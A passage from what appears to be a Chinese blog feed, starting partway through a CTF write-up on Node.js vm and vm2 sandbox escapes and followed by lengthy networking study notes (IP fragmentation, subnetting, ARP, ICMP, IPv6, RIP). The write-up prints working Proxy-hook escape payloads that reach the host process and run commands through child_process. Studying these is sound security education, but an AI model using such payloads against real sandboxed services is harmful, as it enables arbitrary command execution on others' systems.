class="hljs-number">3</span>]<br>numbers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers,&#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>        <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> target) &#123;<br>          <span class="hljs-keyword">return</span> target[prop];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 默认值</span><br>        &#125;<br>      &#125;<br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">1</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">123</span>]);<br><br><span class="hljs-comment">//set</span><br><span class="hljs-keyword">let</span> numbers1 = [];<br><br>numbers1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers1, &#123; <span class="hljs-comment">// (*)</span><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, val</span>) &#123; <span class="hljs-comment">// 拦截写入操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(val) == <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>      target[prop] = val;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>&#125;);<br><br>tmp=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;ceshi&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp));<br>tmp1=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp1));<br></code></pre></td></tr></table></figure><p>下面是利用get钩子和set钩子来进行逃逸的例子</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用get钩子逃逸</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> script =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是在沙箱外部访问了代理对象的任意属性，即使属性不存在也会自动调用钩子函数，这样就和上面一样得到了外部对象然后进行命令执行</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用set钩子</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        set: function(my,key, value) &#123;</span><br><span class="hljs-string">        (value.constructor.constructor(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br>res[<span class="hljs-string">&#x27;&#x27;</span>]=&#123;&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是为代理对象添加属性时会自动调用set钩子，那么就达到了获取外部对象的目的，然后成功命令执行</p></blockquote><p>上面的过程也可以去调试一下代码会更加清晰运行过程。</p><h1><span id="vm2沙箱逃逸">vm2沙箱逃逸</span></h1><p>参考文章：<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQuD=CNcDID&alichlgref=https://www.google.com/#toc-3">NodeJS VM和VM2沙箱逃逸 - 先知社区 (aliyun.com)</a></p><p>vm2的具体实现原理参考这篇文章：<a href="https://www.anquanke.com/post/id/207283">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>vm2在vm的基础上进行了优化，比较重要的就是利用了Proxy代理，使用钩子拦截constructor和__ proto __这些属性的访问。</p><p>网上看好像vm2的代码在3.9版本之后大幅修改，结构变成下面这样</p><p><img src="http://cdn.clown2024.cn/202407151754029.png" alt="image-20240310022305060"></p><p>和上面的文章文件结构都不一样，不过使用的方法没有变化。</p><p>我们用到的vm2的沙箱环境是通过main.js导出的VM和NodeVM，还有一个VMScript是封装了vm.Script</p><p><img src="http://cdn.clown2024.cn/202407151754030.png" alt="image-20240310100756542"></p><p>vm2执行代码示例如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//vm2</span><br><span class="hljs-keyword">const</span>&#123;<span class="hljs-variable constant_">VM</span>,<span class="hljs-title class_">VMScript</span>&#125;=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-comment">//解构赋值，从中提取vm2的VM和VMScript</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><blockquote><p>VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 <code>run</code> 方法即可运行一段脚本。</p></blockquote><p>上述代码的具体运行原理我就贴个图，具体的要去看文章，因为代码结构变了在新的vm2中</p><p><img src="http://cdn.clown2024.cn/202407151754031.png" alt="image-20240310101817366"></p><p>还有一篇文章分析了两个案例：<a href="https://www.anquanke.com/post/id/207291">vm2沙箱逃逸分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1><span id="题目分析">题目分析</span></h1><p>这里找几道题分析吧，vm2原理看得头大。</p><h2><span id="hfctf2020justescape">[HFCTF2020]JustEscape</span></h2><p>这题在buu上面有</p>]]></content>
      
      
      <categories>
          
          <category> ctf web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web ctf nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-4</title>
      <link href="/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/"/>
      <url>/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/</url>
      
        <content type="html"><![CDATA[<h1><span id="网络层概述">网络层概述</span></h1><p>这里放个导图</p><p><img src="http://cdn.clown2024.cn/202407151707703.png" alt="image-20240306232043207"></p><p>网络层主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。</p><p>网络层传输单位是数据报。</p><p><strong>网络层的功能</strong></p><ul><li><p>功能一:路由选择与分组转发(选择最佳路径)</p></li><li><p>功能二:异构网络互联</p></li><li><p>功能三:拥塞控制</p><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施缓解这种拥塞；</p><p>拥塞控制有两种方法：</p><ul><li>开环控制：这是静态的，即提前考虑网络会产生拥塞的各种情况并做好准备</li><li>闭环控制：这是动态的，即在网络运行的时候进行实时调整</li></ul></li></ul><h1><span id="ip数据报格式">IP数据报格式</span></h1><p>IP协议在网络层的占比很大</p><p><img src="http://cdn.clown2024.cn/202407151707704.png" alt="image-20240307125809633"></p><p><strong>ip数据包的整体结构</strong></p><p><img src="http://cdn.clown2024.cn/202407151707705.png" alt="image-20240307141005938"></p><p>数据部分就是传输层的报文段</p><p><strong>具体格式</strong><br><img src="http://cdn.clown2024.cn/202407151707706.png" alt="image-20240307141105140"></p><h1><span id="ip数据报分片">IP数据报分片</span></h1><p><strong>最大传送单元MTU</strong></p><p>链路层数据帧可封装的数据的上限</p><p>以太网的MTU是1500字节</p><p><img src="http://cdn.clown2024.cn/202407151707707.png" alt="image-20240307141645466"></p><p>链路层的数据帧的数据部分就是IP分组，所以IP分组大小不能超过MTU，以太网就是不能超过1500字节；如果超过了MTU就要采取数据报分片的方法。</p><p><strong>分片</strong></p><p>分片的就和上面数据报中的标识、标志、片偏移三个部分相关</p><ul><li><p>标识：同一数据报的分片使用同一标识。比如有三个数据报他们的标识都是888，那他们就是属于同一个数据报，最后会重新组合成一个完整的数据报。</p></li><li><p>标志：只有两位有意义</p><p>中间位DF（Don’t Fragment）：DF&#x3D;1,禁止分片；DF&#x3D;0，允许分片。</p><p>最低位MF（More Fragment）：MF&#x3D;1，后面还有分片；MF&#x3D;0，代表最后一片&#x2F;没分片。</p><p>最低位要在DF为0是才有讨论意义</p></li><li><p>片偏移：指出较长分组分片后，某片在原分组中的相对位置，以8B为单位。</p><p>比如片偏移字段为0000000000001，则代表该分片在8B的位置开始。</p><p>所以除了最后一个分片不一定，每个分片的长度一定是8B的整数倍。</p></li></ul><h2><span id="例题">例题</span></h2><p>一个很基础的例题，对上面一些概念的运用和简单计算</p><p><img src="http://cdn.clown2024.cn/202407151707708.png" alt="image-20240307143646764"></p><h1><span id="ipv4地址">IPv4地址</span></h1><h2><span id="ip分类的历史阶段">IP分类的历史阶段</span></h2><p>分类的IP地址&#x3D;》子网的划分&#x3D;》构成超网(无分类编址方法)</p><h2><span id="分类的ip地址">分类的IP地址</span></h2><p>IP地址：唯一的32位&#x2F;4字节标识符，标识路由器主机的接口</p><p>IP地址&#x3D;{&lt;网络号&gt;,&lt;主机号&gt;}</p><p>为了方便人阅读，采用点分十进制的转换法</p><p><img src="http://cdn.clown2024.cn/202407151707709.png" alt="image-20240307144802830"></p><p><strong>各类别IP地址划分</strong></p><p><img src="http://cdn.clown2024.cn/202407151707710.png" alt="image-20240307145139846"></p><p><strong>特殊IP地址</strong></p><p><img src="http://cdn.clown2024.cn/202407151707711.png" alt="image-20240307145608889"></p><p><strong>私有IP地址</strong></p><p><img src="http://cdn.clown2024.cn/202407151707712.png" alt="image-20240307145720156"></p><p><strong>可用网络号和主机数计算</strong></p><p><img src="http://cdn.clown2024.cn/202407151707713.png" alt="image-20240307150107170"></p><blockquote><p>主机数需要减去全0和全1两种特殊情况</p><p>网络数A类需要减去全0和127，B类和C类只要减去全0</p></blockquote><h1><span id="网络地址转换nat">网络地址转换NAT</span></h1><p>因为路由器对目的地址是私有IP地址的数据报一律不进行转发，那我们平时上网是怎么去外界通信呢，就是用到了NAT技术。</p><p><strong>网络地址转换NAT(NetworkAddress Translation)：</strong>在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址。这是一个示例图</p><p><img src="http://cdn.clown2024.cn/202407151707714.png" alt="image-20240307151440901"></p><h1><span id="子网划分与子网掩码">子网划分与子网掩码</span></h1><h2><span id="子网划分">子网划分</span></h2><p>就是将**{&lt;网络号&gt;,&lt;主机号&gt;}<strong>这样的两级IP地址变成</strong>{&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}**这样的三级IP地址；不过外界是不知道内部的子网如何划分的。</p><p><img src="http://cdn.clown2024.cn/202407151707715.png" alt="image-20240307152212955"></p><h2><span id="子网掩码">子网掩码</span></h2><p>网络号(子网号也是)对应的二进制位全为1，主机号则全为0。</p><p><img src="http://cdn.clown2024.cn/202407151707716.png" alt="image-20240307221224860"></p><blockquote><p>子网掩码与IP地址逐位相与，就得到子网网络地址</p></blockquote><h3><span id="例题">例题</span></h3><p>已知IP地址141.14.72.24，子网掩码是255.255.192.0，求网络地址</p><p>直接中间8位的192写出来和72一与就可以得到64，所以子网网络号为141.14.64.0。</p><h2><span id="使用子网时的分组转发">使用子网时的分组转发</span></h2><p><img src="http://cdn.clown2024.cn/202407151707717.png" alt="image-20240307222755852"></p><h1><span id="无分类编址cidr">无分类编址CIDR</span></h1><p><strong>CIDR消除了传统的A类，B类和C类地址以及划分子网的概念；网络号和子网号统一变成网络前缀。</strong></p><p><img src="http://cdn.clown2024.cn/202407151707718.png" alt="image-20240307230252926"></p><blockquote><p>CIDR的写法是IP地址后加上&#x2F;，然后写上网络前缀的位数，比如：128.14.32.0&#x2F;20</p></blockquote><p><strong>CIDR融合子网地址与子网掩码，方便子网划分</strong></p><p><img src="http://cdn.clown2024.cn/202407151707719.png" alt="image-20240307230656231"></p><h2><span id="构成超网">构成超网</span></h2><p>将多个子网聚合成一个较大的子网，叫做构成超网，或路由聚合。</p><p>其方法就是将网络前缀缩短，在所有的网络地址取交集。</p><p><img src="http://cdn.clown2024.cn/202407151707720.png" alt="image-20240307231403673"></p><p>比如上面的IP地址的交集就是前16位，然后就把前16位当作新的网络前缀。</p><h2><span id="最长前缀匹配">最长前缀匹配</span></h2><p>使用CIDR时，查找路由表可能得到几个匹配结果(跟网络掩码按位相与)，应选择具有最长网络前缀的路由。<br>前缀越长，地址块越小，路由越具体。</p><p>下面是一个例子：</p><p><img src="http://cdn.clown2024.cn/202407151707721.png" alt="image-20240308001842598"></p><p>目的地址分别与上述路由表中的所有地址块进行匹配，左边两个都能成功匹配到网络号，而计算机系的网络前缀最长，所以会发送给计算机系。</p><h1><span id="arp协议">ARP协议</span></h1><p>ARP协议有点类似于网络层和链路层的一个中间协议，因为ARP协议就是完成主机或路由器IP地址到MAC地址的映射，也就是解决下一跳走哪的问题。</p><blockquote><p>在实际网络的链路上传输数据帧时，最终必须使用MAC地址</p></blockquote><p><strong>ARP协议使用过程</strong></p><p>检查ARP高速缓存，有对应表项则写入MAC帧，没有则用目的MAC地址为FF-FF-FF-FF-FF-FF的帧封装并广播ARP请求分组，同一局域网中所有主机都能收到该请求。目的主机收到请求后就会向源主机单播一个ARP响应分组，源主机收到后将此映射写入ARP缓存(10-20min更新一次)。</p><p><strong>ARP协议的四种典型情况</strong></p><ol><li><p>主机A发给本网络上的主机B:用ARP找到主机B的硬件地址;</p></li><li><p>主机A发给另一网络上的主机B:用ARP找到本网络上一个路由器(网关)的硬件地址；</p></li><li><p>路由器发给本网络的主机A:用ARP找到主机A的硬件地址；</p></li><li><p>路由器发给另一网络的主机B:用ARP找到本网络上的一个路由器的硬件地址。</p></li></ol><p><strong>下面用向本局域网主机发送数据和向其他局域网主机发送数据的两个例子来说明ARP协议的运用</strong></p><p><img src="http://cdn.clown2024.cn/202407151707722.png" alt="image-20240308153147166"></p><p>现在是向本局域网内的3号主机发送数据，首先会在本地的ARP高速缓存中检查有没有3号主机对应的mac地址，没有的话就会另IP3为全1发送一个广播分组，交换机收到请求之后就会发送给所有主机，所有主机收到请求后，如果是对应的IP地址就会返回一个单播ARP响应分组，其中就包含了自己的mac地址。</p><p><img src="http://cdn.clown2024.cn/202407151707723.png" alt="image-20240308154025422"></p><p>这是向非局域网内的5号主机传输数据，会先将IP5与自己的子网掩码相与一下看是否在同一个网段，如果不在就直接跳到自己的默认网关，局域网内的主机都知道自己的默认网关地址，然后就可以发送广播分组得到默认网关的mac地址，然后这里就填上mac6发送到默认网关，后面的mac地址的改变调整是路由器转发数据出去时自己内部改变的，包含自身mac地址和要去的mac地址。</p><blockquote><p>交换机是没有mac地址的，要主机和路由器接口才有。</p><p>默认网关就是本局域网和外界通信的一个接口。</p></blockquote><h1><span id="dhcp协议">DHCP协议</span></h1><h2><span id="主机要如何获得ip地址">主机要如何获得IP地址</span></h2><ol><li><p>静态配置：也就是管理由手动配置<strong>IP地址</strong>，<strong>子网掩码</strong>，<strong>默认网关</strong>这些东西</p></li><li><p>动态配置：这就是利用DHCP服务器来给局域网内的主机自动分配一个IP地址</p><p><img src="http://cdn.clown2024.cn/202407151707724.png" alt="image-20240308155102460"></p></li></ol><h2><span id="dhcp工作过程">DHCP工作过程</span></h2><p><strong>动态主机配置协议DHCP是应用层协议，</strong>使用客户&#x2F;服务器方式，客户端和服务端通过广播方式进行交互，基于UDP。</p><p>DHCP提供即插即用联网的机制，主机可以从服务器动态获取IP地址、子网掩码、默认网关、DNS服务器名称与IP地址，允许地址重用，支持移动用户加入网络，支持在用地址续租。</p><p><strong>流程</strong></p><ol><li>主机广播DHCP发现报文，也就是探测网络中是否有DHCP服务器，请求获得IP地址</li><li>DHCP服务器广播DHCP提供报文，收到请求的服务器如果有空闲的IP地址及其相关配置都会广播发送出去</li><li>主机广播DHCP请求报文，收到多个提供报文，选择其中的一个IP地址使用(先到先得)，广播发送确认使用该IP地址</li><li>DHCP服务器广播DHCP确认报文，正式将该IP分配给主机</li></ol><h1><span id="icmp协议">ICMP协议</span></h1><p>ICMP协议起到传输层和网络层的桥梁作用。</p><p>ICMP协议支持主机或路由器，在网络层的分组出错时，在分组被丢弃之后需要发送一个差错(或异常报告)，也就是发送特定ICMP报文：ICMP差错报文，ICMP询问报文</p><h2><span id="icmp结构">ICMP结构</span></h2><p>ICMP报文是装在IP数据报的数据部分</p><p><img src="http://cdn.clown2024.cn/202407151707725.png" alt="image-20240309000752280"></p><h2><span id="icmp的5种差错报告报文">ICMP的5种差错报告报文</span></h2><ol><li>终点不可达：当路由器或主机不能交付数据报时就向源点发送终点不可达报文，即无法交付</li><li>源点抑制：当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢，在网络拥塞丢失数据是发生；<strong>不过现在已经不用这种报文了</strong>。</li><li>时间超过：当路由器收到生存时间TTL&#x3D;0的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文，即 TTL&#x3D;0时。</li><li>参数问题：当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文。首部字段有问题时发生。</li><li>改变路由(重定向)：路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器<br>，选择更好的路由。</li></ol><p><strong>ICMP差错报告报文数据格式</strong></p><p><img src="http://cdn.clown2024.cn/202407151707726.png" alt="image-20240309001638857"></p><p><strong>不发送ICMP差错报文的情况</strong></p><ol><li><p>对ICMP差错报告报文不再发送ICMP差错报告报文。</p></li><li><p>对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文。</p></li><li><p>对具有组播地址的数据报都不发送ICMP差错报告报文(组播地址区别于广播地址，一点到多点即可，只用给部分节点发送，而不像广播地址发送给所有节点)。</p></li><li><p>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文。</p></li></ol><h2><span id="icmp询问报文">ICMP询问报文</span></h2><ol><li><p>回送请求和回答报文：主机或路由器向特定目的主机发出的询问，收到此报文的主机必须给源主机或路由器发送ICMP回送回答报文。测试目的站是否可达以及了解其相关状态。(平时用的ping命令就是一种)</p></li><li><p>时间戳请求和回答报文：请某个主机或路由器回答当前的日期和时间。用来进行时钟同步和测量时间。2.时间戳请求和回答报文</p></li><li><p>掩码地址请求和回答报文</p></li><li><p>路由器询问和通告报文</p></li></ol><blockquote><p>第三和第四种现在已经不再使用了</p></blockquote><h2><span id="icmp的应用">ICMP的应用</span></h2><p>这里介绍两个命令</p><ol><li><p>ping：该命令测试两个主机之间的连通性，使用了ICMP回送请求和回答报文</p></li><li><p>traceroute(Windows上是tracert)：跟踪一个分组从源点到终点的路径，使用了ICMP时间超过差错报告报文</p><p>他的原理是这样的</p><p><img src="http://cdn.clown2024.cn/202407151707727.png" alt="image-20240309002552980"></p><p>一开始的报文TTL设置为1，经过一个路由，TTL变为0然后返回差错报告报文，就可以测试出一个路由，此后每次TTL加1，以此类推就可以测出经过多少路由，也就知道了路径。</p><p><img src="http://cdn.clown2024.cn/202407151707728.png" alt="image-20240309003134315"></p><blockquote><p>结果说明：第一列表示到达目标服务器经过的网络节点数，2-4列分别表示请求目标节点时间、目标节点响应时间和平均响应时间，最右边则表示到达目标服务器所经过的每个网络节点的IP</p></blockquote></li></ol><h1><span id="ipv6">IPv6</span></h1><p>因为IPv4的地址空间分配殆尽，所以IPv6就出现了来解决地址空间不足问题。</p><p><strong>IPv6的改变</strong></p><p>改进了首部格式以便快速处理和快速转发。</p><p>支持QoS(Quality of Service，服务质量)：指一个网络能够利用各种基础技术，为指定的网络通信提供更好的服务能力,是网络的一种安全机制，是用来解决网络延迟和阻塞等问题的一种技术。</p><h2><span id="数据报格式">数据报格式</span></h2><p><img src="http://cdn.clown2024.cn/202407151707729.png" alt="image-20240309004131851"></p><p><img src="http://cdn.clown2024.cn/202407151707730.png" alt="image-20240309005425608"></p><ol><li>这里的版本指明了协议版本，IPv6他的字段值就是6</li><li>优先级就是区分数据报的类别和优先级</li><li>流标签有点类似数据报分片中的标识位，“流”是互联网络上从特定源点到特定终点的一系列数据报。所有属于同一个流的数据报都具有同样的流标签。比如B和A主机进行连接传输数据，在该连接上B向A发出的多个数据包都属于同一个流，所以他们也就有相同的流标签。</li><li>下一个首部顾名思义就是表示下一个首部是谁，比如基本首部的下一个首部标识扩展首部1，扩展首部的下一个首部标识扩展首部2，扩展首部2的下一个首部标识数据部分。</li><li>跳数限制就相当于IPv4的TTL。</li></ol><h2><span id="ipv6和ipv4的区别">IPv6和IPv4的区别</span></h2><p><img src="http://cdn.clown2024.cn/202407151707731.png" alt="image-20240309010458862"></p><blockquote><p>在第七点中，因为在传输过程中不能在路由分片，所以如果超过了数据链路层的最大传输单元MTU就会将数据报丢弃，返回一个ICMPv6差错报文。</p></blockquote><h2><span id="ipv6地址表示形式">IPv6地址表示形式</span></h2><ol><li><p>一般形式：冒号十六进制记法**(八组四位十六进制数)**，比如：4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</p></li><li><p>压缩形式</p><p><img src="http://cdn.clown2024.cn/202407151707732.png" alt="image-20240309011120976"></p></li></ol><h2><span id="ipv6基本地址类型">IPv6基本地址类型</span></h2><ol><li>单播：一对一通信，可做源地址+目的地址</li><li>多播：一对多通信，可做目的地址</li><li>任播：一对多中的一个通信，可做目的地址</li></ol><h2><span id="ipv6向ipv4过渡策略">IPv6向IPv4过渡策略</span></h2><ol><li><strong>双栈协议：</strong>双协议栈技术就是指在一台设备上<strong>同时启用IPv4协议栈和IPv6协议栈</strong>。这样的话，这台设备既能和IPv4网络通信，又能和IPv6网络通信。如果这台设备是一个路由器，那么这台路由器的不同接口上，分别配置了IPv4地址和IPv6地址，并很可能分别连接了IPv4网络和IPv6网络。如果这台设备是一个计算机，那么它将同时拥有IPv4地址和IPv6地址，并具备同时处理这两个协议地址的功能。</li><li><strong>隧道技术：</strong>通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送。比如一段IPv6的数据报加上IPv4的首部，而IPv6的数据报则作为数据部分，然后重新封装当作IPv4进行传播。</li></ol><h1><span id="sdn">SDN</span></h1><h2><span id="路由转发和路由选择">路由转发和路由选择</span></h2><p><strong>转发：</strong></p><p>达到路由器输入链路之一的数据报如何转发到该路由器的输出链路之一。花费时间短，通常用硬件解决</p><p><strong>数据平面</strong></p><p>数据平面对于数据处理过程中各种具体处理转发过程。对应路由转发</p><p><strong>路由选择：</strong></p><p>控制数据报沿着从源主机到目的主机的端到端路径中路由器之间的路由方式。花费时间长，通常用软件解决。</p><p><strong>控制平面</strong></p><p>控制平面用于控制和管理网络协议的运行，比如OSPF协议、RIP协议、BGP协议。对应路由选择。</p><h2><span id="数据平面">数据平面</span></h2><p>数据平面执行的主要功能是根据转发表进行转发，这是路由器的本地动作。</p><p><img src="http://cdn.clown2024.cn/202407151707733.png" alt="image-20240306235123180"></p><h2><span id="控制平面">控制平面</span></h2><p><strong>控制平面的传统方法也叫每路由器法：</strong></p><p>路由选择算法运行在每台路由器中，并且在每台路由器中都包含转发和路由选择两种功能。</p><p>具体原理为：在一台路由器中的路由选择算法与其他路由器中的路由选择算法通信(通过交换路由选择报文)<br>计算出路由表和转发表。</p><p><strong>SDN方法：Software-Defined Networking</strong></p><p>控制平面从路由器物理上分离。路由器仅实现转发，远程控制器计算和分发转发表以供每台路由器所使用。</p><p>具体原理为：路由器通过交换包含转发表和其他路由选择信息的报文与远程控制器通信。因为计算转发并与路由器交互的控制器是用软件实现的，所以网络是软件定义的。</p><p><img src="http://cdn.clown2024.cn/202407151707734.png" alt="image-20240307093103127"></p><p><strong>控制平面中的路由选择处理器</strong></p><p>传统方法：路由选择处理器执行控制平面功能。在传统的路由器中，它执行路由选择协议，维护路由选择表于关联链路状态信息，并为该路由器计算转发表。</p><p>SDN方法：在SDN路由器中，路由选择处理器负责与远程控制器通信，目的是接收远程控制器计算的转发表项。</p><h2><span id="sdn组件">SDN组件</span></h2><ul><li><p>SDN控制器：维护准确的网络状态信息(远程链路、交换机和主机的状态);为运行在控制平面中的网络控制应用程序提供这些信息(逻辑集中，在多台服务器上实现)</p></li><li><p>网络控制应用程序：根据SDN控制器提供的方法，这些应用程序通过这些方法能够监视、编程和控制下面的网<br>络设备。</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151707735.png" alt="image-20240307093843773"></p><p><strong>SDN控制器的细节</strong></p><p><img src="http://cdn.clown2024.cn/202407151707736.png" alt="image-20240307094357878"></p><h1><span id="路由算法">路由算法</span></h1><ul><li><p><strong>静态路由算法(非自适应路由算法)</strong>,</p><p>由管理员手工配置路由信息。<br>简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，广泛用于高度安全性的军事网络和较小的商业网络。路由更新慢，不适用大型网络。</p></li><li><p><strong>动态路由算法(自适应路由算法)</strong></p><p>由路由器间彼此交换信息，按照路由算法优化出路由表项。<br>路由更新快，适用大型网络，及时响应链路费用或网络拓扑变化。<br>算法复杂，增加网络负担。</p><p><strong>动态路由算法又可以分为全局性和分散性</strong></p><ul><li><p>全局性：链路状态路由算法(OSPF)</p><p>所有路由器掌握完整的网络拓扑和链路费用信息。</p></li><li><p>分散性：距离向量路由算法(RIP)</p><p>路由器只掌握物理相连的邻居及链路费用。</p></li></ul></li></ul><h1><span id="分层次路由选择协议">分层次路由选择协议</span></h1><p>分层协议产生的原因是因为很多单位在接入因特网的同时还要隐藏自己的路由选择协议，这里就涉及到一个自治系统AS的概念</p><p><strong>自治系统AS</strong></p><p>在单一的技术管理下的一组路由器，而这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由，同时还使用一种AS之间的路由协议以确定在AS之间的路由。个AS内的所有网络都属于一个行政单位来管辖，一个自治系统的所有路由器在本自治系统内都必须连通</p><p><strong>路由选择协议又分为两种</strong></p><p><img src="http://cdn.clown2024.cn/202407151707737.png" alt="image-20240307125518139"></p><blockquote><p>现在常用的是BGP-4</p></blockquote><h1><span id="rip协议">RIP协议</span></h1><p><strong>定义</strong></p><p>RIP是一种分布式的基于距离向量的路由选择协议，是因特网的协议标准，最大优点是简单；它适用于小型网络。</p><p><strong>相关规则</strong></p><p>RIP协议要求网络中每一个路由器都维护从它自己到其他每一个目的网络的唯一最佳距离记录(即一组距离)</p><p>&#x3D;&#x3D;距离：&#x3D;&#x3D;通常为“跳数”，即从源端口到目的端口所经过的路由器个数，经过一个路由器跳数+1。特别的，从由器到直接连接的网络距离为1。RIP允许一条路由最多只能包含15个路由器，因此距离为16表示网络不可达<br>一路</p><p>一个示例图：</p><p><img src="http://cdn.clown2024.cn/202407151707738.png" alt="image-20240309012809494"></p><h2><span id="rip协议交换规则">RIP协议交换规则</span></h2><ol><li>仅和相邻路由器交换信息</li><li>路由器交换的信息是自己的路由表</li><li>每30秒交换一次路由信息，然后路由器根据新信息更新路由表。若超过180s没收到邻居路由器的通告，则判定邻居没了，并更新自己路由表。</li></ol><blockquote><p>路由器刚开始工作时，只知道直接连接的网络的距离(距离为1)，接着每一个路由器也只和数目非常有限的相路由器交换并更新路由信息。</p><p>经过若干次更新后，所有路由器最终都会知道到达本自治系统任何一个网络的最短距离和下一跳路由器的地址,即“收敛</p></blockquote><h2><span id="距离向量算法">距离向量算法</span></h2><ol><li><p>修改相邻路由器发来的RIP报文中所有表项。</p><p>对地址为X的相邻路由器发来的RIP报文，修改此报文中的所有项目：把“下一跳”字段中的地址改为X，并把<br>所有的“距离”字段+1。</p><p>这里用一个演示图解释一下：</p><p><img src="http://cdn.clown2024.cn/202407151707739.png" 